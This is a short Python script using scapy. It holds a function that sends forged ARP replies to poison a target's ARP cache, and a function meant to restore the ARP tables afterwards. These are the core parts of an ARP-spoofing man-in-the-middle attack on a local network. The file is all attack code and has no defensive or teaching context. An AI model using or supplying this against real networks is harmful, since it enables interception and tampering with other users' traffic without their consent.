import scapy.all as scapy

def arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac):
    # Create an ARP packet with the specified parameters
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    
    # Send the ARP packet
    scapy.send(arp_packet, verbose=False)
    
    # Print a message indicating the ARP packet was sent
    print("Sent ARP packet from", spoof_ip, "to", target_ip)


def restore(target_ip, target_mac, spoof_ip, spoof_mac):
    # Create ARP packets to restore the ARP tables of the target and spoofed IP addresses
    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    spoof_packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip, hwsrc=target_mac)
    
    # Send the ARP packets to restore the ARP tables
    scapy.send(target_packet, verbose=False)
    scapy.send(spoof_packet, verbose=False)
    
    # Print a message indicating that the ARP packets were sent to restore ARP tables
    print("Sent ARP packets to restore ARP tables")
